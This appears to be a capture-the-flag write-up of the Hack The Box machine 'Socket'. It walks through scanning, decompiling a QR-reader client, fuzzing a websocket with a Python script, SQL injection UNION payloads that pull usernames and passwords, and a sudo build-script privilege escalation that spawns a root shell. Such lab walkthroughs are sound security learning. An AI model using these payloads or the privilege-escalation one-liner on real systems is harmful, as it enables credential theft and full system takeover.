---
title: "Socket HTB"
date: 2023-03-31T23:13:39-07:00
draft: false
---


![](https://www.hackthebox.com/storage/avatars/9a73cabc03399aaac0640a0148e3a371.png)


# Scan

~~~bash
sudo nmap -sU -sS -p- --min-rate=10000 -T5 10.129.180.100


PORT     STATE SERVICE  
22/tcp   open  ssh  
80/tcp   open  http  
5789/tcp open  unknown
~~~

port `5789` is a websocket port and the website is running flask it is safe to guess that flask is also hosting the websocket server

~~~req
POST /reader HTTP/1.1
Host: qreader.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------181768716810445582851724692176
Content-Length: 745
Origin: http://qreader.htb
Connection: close
Referer: http://qreader.htb/
Upgrade-Insecure-Requests: 1

-----------------------------181768716810445582851724692176
Content-Disposition: form-data; name="file"; filename="qrcode.png"
Content-Type: image/png

PNG

   
IHDR  ô  ô    ã­â'  ÓIDATxíÝAnÄ @Q»ê¹ÿ)áîB+%LhÚÏbÔÌ
9P5¹ÒÂÇ%.Çãñx<¿×Y:³ºÃøÕóÇãñø«>/xeÕSUÕzéëLÇãñ½ÆöJiªÃ!sããñxü­þsØ£""¶ýõ¦øx<ÿû¼_Çãßë«ü¯)q¨8ðª:ú*ÈêùãñxüÙ×¿pü«âLT
Y=<?ÛâúwtÚ$hì°Ñ	ññx<~ïÏÿ5^|Ú	ì~óx<þÑ¾ÊÿT?¬újê5ô:¼½/?ÇnÍg©êëö~äÇR&ÿÃãñO÷»üO¶4OD,~J*}Äor|<_åsþ×¤~}þWïúFþÇãëwõßúÅGHÒ>!ûx<þÙ~|ÿK=ÄwãÈÿðxü_ñýå.õ£ÛnBpÛí0¯©ññx<~¡o.wI÷_í§?87>ÇßêÇ÷¿Ã¾ú&dV|<_åXÿÊYgKkö
WÏÇã'ø\ÒØhÞw×¡ÎÇãñ·úïê¿®®4E`ê¿x<þé^ùÿx<ÇãñÿÊ¸5ix	    IEND®B`
-----------------------------181768716810445582851724692176--
~~~




# Code analysis
upon exploring the website there is a download for the qr code reader and embed-er. Remembering that it was a python web app there should be a way to convert it back to source code. `https://github.com/extremecoders-re/pyinstxtractor` will get the source code back but it will also have all the libraries and such with it. Then using decompile++ `https://github.com/zrax/pycdc.git` 

# Source code
~~~python
# Source Generated with Decompyle++
# File: qreader.pyc (Python 3.10)

import cv2
import sys
import qrcode
import tempfile
import random
import os
from PyQt5.QtWidgets import *
from PyQt5 import uic, QtGui
import asyncio
import websockets
import json
VERSION = '0.0.2'
ws_host = 'ws://ws.qreader.htb:5789'
icon_path = './icon.png'

def setup_env():
    global tmp_file_name
    pass
# WARNING: Decompyle incomplete


class MyGUI(QMainWindow):
    
    def __init__(self = None):
        super(MyGUI, self).__init__()
        uic.loadUi(tmp_file_name, self)
        self.show()
        self.current_file = ''
        self.actionImport.triggered.connect(self.load_image)
        self.actionSave.triggered.connect(self.save_image)
        self.actionQuit.triggered.connect(self.quit_reader)
        self.actionVersion.triggered.connect(self.version)
        self.actionUpdate.triggered.connect(self.update)
        self.pushButton.clicked.connect(self.read_code)
        self.pushButton_2.clicked.connect(self.generate_code)
        self.initUI()

    
    def initUI(self):
        self.setWindowIcon(QtGui.QIcon(icon_path))

    
    def load_image(self):
        options = QFileDialog.Options()
        (filename, _) = QFileDialog.getOpenFileName(self, 'Open File', '', 'All Files (*)')
        if filename != '':
            self.current_file = filename
            pixmap = QtGui.QPixmap(self.current_file)
            pixmap = pixmap.scaled(300, 300)
            self.label.setScaledContents(True)
            self.label.setPixmap(pixmap)
            return None

    
    def save_image(self):
        options = QFileDialog.Options()
        (filename, _) = QFileDialog.getSaveFileName(self, 'Save File', '', 'PNG (*.png)', options, **('options',))
        if filename != '':
            img = self.label.pixmap()
            img.save(filename, 'PNG')
            return None

    
    def read_code(self):
        if self.current_file != '':
            img = cv2.imread(self.current_file)
            detector = cv2.QRCodeDetector()
            (data, bbox, straight_qrcode) = detector.detectAndDecode(img)
            self.textEdit.setText(data)
            return None
        None.statusBar().showMessage('[ERROR] No image is imported!')

    
    def generate_code(self):
        qr = qrcode.QRCode(1, qrcode.constants.ERROR_CORRECT_L, 20, 2, **('version', 'error_correction', 'box_size', 'border'))
        qr.add_data(self.textEdit.toPlainText())
        qr.make(True, **('fit',))
        img = qr.make_image('black', 'white', **('fill_color', 'back_color'))
        img.save('current.png')
        pixmap = QtGui.QPixmap('current.png')
        pixmap = pixmap.scaled(300, 300)
        self.label.setScaledContents(True)
        self.label.setPixmap(pixmap)

    
    def quit_reader(self):
        if os.path.exists(tmp_file_name):
            os.remove(tmp_file_name)
        sys.exit()

    
    def version(self):
        response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            version_info = data['message']
            msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)

    
    def update(self):
        response = asyncio.run(ws_connect(ws_host + '/update', json.dumps({
            'version': VERSION })))
        data = json.loads(response)
        if 'error' not in data.keys():
            msg = '[INFO] ' + data['message']
            self.statusBar().showMessage(msg)
            return None
        error = None['error']
        self.statusBar().showMessage(error)

    __classcell__ = None


async def ws_connect(url, msg):
    pass
# WARNING: Decompyle incomplete


def main():
    (status, e) = setup_env()
    if not status:
        print('[-] Problem occured while setting up the env!')
    app = QApplication([])
    window = MyGUI()
    app.exec_()

if __name__ == '__main__':
    main()
    return None

~~~
In theory there should be a few ways to do this, hide a payload inside the qr code with exiftool, find some kind of server side injection vulnerability, or some kind of input invalidation in the websocket route.

# Socks
~~~bash
websocat -S ws://10.129.200.210:5789/vesion

{"version":"0.0.2"}  
{"paths": {"/update": "Check for updates", "/version": "Get version information"}}
~~~
it looks like there might be some kind of input invalidation vulnerability.

~~~python
def version(self):

response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({

'version': VERSION })))

data = json.loads(response)

if 'error' not in data.keys():

version_info = data['message']

msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''

self.statusBar().showMessage(msg)

return None

error = None['error']

self.statusBar().showMessage(error)
~~~
If there is some kind of way to have a valid json dump but escalate it to dump the `/etc/passwd` file then it would be a pretty easy foothold from there because all it is checking in the code is if it is a valid json then sending it back to the user. The hardest part is testing because you have to reconnect once you send a valid json.

# Interception

using wireshark to listen on your htb iface and connecting with websocat will allow you to see the traffic and can put the request into burp to fuzz.

~~~r
GET /version HTTP/1.1  
Host: qreader.htb:5789  
Connection: Upgrade  
Upgrade: websocket  
Sec-WebSocket-Version: 13  
Sec-WebSocket-Key: G2+NJRB08FAXqPPqLghE9w==
~~~

to look for more endpoints use the following command
~~~sh
gobuster dir -u http://qreader.htb:5789 -w /usr/share/dirb/wordlists/big.txt -H "Host: qreader.htb:5  
789" -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: G2  
+NJRB08FAXqPPqLghE9w==" -s "101,200" -b "" --timeout 5s --threads 30
~~~
Using the code bellow will allow you to fuzz the websocket
~~~python
from websocket import create_connection

import sys

import json

import time as t

  

ws_url = 'ws://qreader.htb:5789/version'

payloads = open('/usr/share/wfuzz/wordlist/Injections/All_attack.txt', 'r', errors='ignore').readlines()

headers = ["Host: qreader.htb:5789","Connection: Upgrade", "Upgrade: websocket","Sec-WebSocket-Version: 13","Sec-WebSocket-Key: G2+NJRB08FAXqPPqLghE9w=="]

  
  

for payload in payloads:

data = json.dumps({"version":payload})

#print(data)

ws = create_connection(ws_url, timeout=5, headers=headers)

#print("connected!")

#print(ws.recv())

#print(f"Sending {data}")

ws.send(data)

#print("Sent")

#print("Receiving...")

result = ws.recv()

if "Invalid version" not in result and 0 != len(result):

print(f"Received {result} with payload: {data}")

ws.close()

t.sleep(0.2)
~~~
while fuzzing you should get some successful payloads.  To escalate it further you can use the payload list bellow to get the username and password.
~~~sql
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --


-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@

1 AND (SELECT * FROM Users) = 1	

' AND MID(VERSION(),1,1) = '5';

' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
'0.0.3" UNION SELECT group_concat(answer),"2","3","4" FROM answers;-- -'
SELECT name, description, price FROM products WHERE category=1 AND 1=2 UNION SELECT table_schema, table_name, 1 FROM information_schema.table
'0.0.3" UNION SELECT group_concat(answer),"2","3","4" FROM answers;-- -'
'0.0.3" UNION SELECT username,password,"3","4" from users;-- -'
~~~

~~~json
{"message": {"id": "Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller,Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller
~~~


# Foot hold
After cracking the password now you can get the user flag

# Priv Esc
to get root run linpeas.sh and it has something to do with an `build-installer.sh` file
~~~sh
User tkeller may run the following commands on socket:  
(ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
~~~

~~~sh
#!/bin/bash  
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then  
/usr/bin/echo "No enough arguments supplied"  
exit 1;  
fi  
  
action=$1  
name=$2  
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')  
  
if [[ -L $name ]];then  
/usr/bin/echo 'Symlinks are not allowed'  
exit 1;  
fi  
  
if [[ $action == 'build' ]]; then  
if [[ $ext == 'spec' ]] ; then  
/usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null  
/home/svc/.local/bin/pyinstaller $name  
/usr/bin/mv ./dist ./build /opt/shared  
else  
echo "Invalid file format"  
exit 1;  
fi  
elif [[ $action == 'make' ]]; then  
if [[ $ext == 'py' ]] ; then  
/usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null  
/root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp  
/usr/bin/mv ./dist ./build /opt/shared  
else  
echo "Invalid file format"  
exit 1;  
fi  
elif [[ $action == 'cleanup' ]]; then  
/usr/bin/rm -r ./build ./dist 2>/dev/null  
/usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null  
/usr/bin/rm /tmp/qreader* 2>/dev/null  
else  
/usr/bin/echo 'Invalid action'  
exit 1;  
fi
~~~

running the following command will get root:
~~~sh
echo 'import os;os.system("/bin/bash")' > /tmp/file.spec; sudo /usr/local/sbin/build-installer.sh build /tmp/file.spec
~~~
it makes a python script in the tmp dir and the build installer builds it and runs it giving you root because it spawns a new shell from `os.system("/bin/bash")`.
